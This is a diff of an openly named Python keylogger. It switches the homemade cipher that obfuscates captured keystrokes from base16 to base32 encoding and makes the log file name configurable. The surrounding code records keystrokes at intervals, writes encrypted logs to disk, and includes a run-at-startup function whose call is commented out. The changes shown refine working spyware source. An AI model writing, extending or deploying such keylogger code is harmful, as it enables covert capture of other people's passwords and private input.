@@ -23,7 +23,7 @@ class Cipher:
             encrypted += str(c_new)
         else:
             encrypted += c
-    encrypted = base64.b64encode(base64.b16encode(bytes(encrypted, encoding='utf-8')))
+    encrypted = base64.b64encode(base64.b32encode(bytes(encrypted, encoding='utf-8')))
     return encrypted
 
    def decrypt(ciphertext, key=16):
@@ -48,16 +48,14 @@ class Cipher:
     return decrypted
 
 SEND_REPORT_EVERY = 3
+FILENAMEBASE = "keylog"
 
 
 class Keylogger:
-    def __init__(self, interval):
+    def __init__(self, interval, FILENAMEBASE):
         self.interval = interval
-
-        # this is the string variable that contains the log of all 
-        # the keystrokes within `self.interval`
+        self.FILENAMEBASE = FILENAMEBASE
         self.log = ""
-
         self.start_dt = datetime.now()
         self.end_dt = datetime.now()
 
@@ -78,10 +76,9 @@ class Keylogger:
     def update_filename(self):
         start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
         end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
-        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"
+        self.filename = f"{self.FILENAMEBASE}-{start_dt_str}_{end_dt_str}"
 
     def report_to_file(self):
-
         with open(f"{self.filename}.txt", "w") as f:
             print(Cipher.encrypt(self.log, key=16), file=f)
         print(f"[+] Saved {self.filename}.txt")
@@ -120,5 +117,5 @@ def run_at_startup():
 
 if __name__ == "__main__":
     # run_at_startup()
-    keylogger = Keylogger(interval=SEND_REPORT_EVERY)
+    keylogger = Keylogger(interval=SEND_REPORT_EVERY, FILENAMEBASE=FILENAMEBASE)
     keylogger.start()
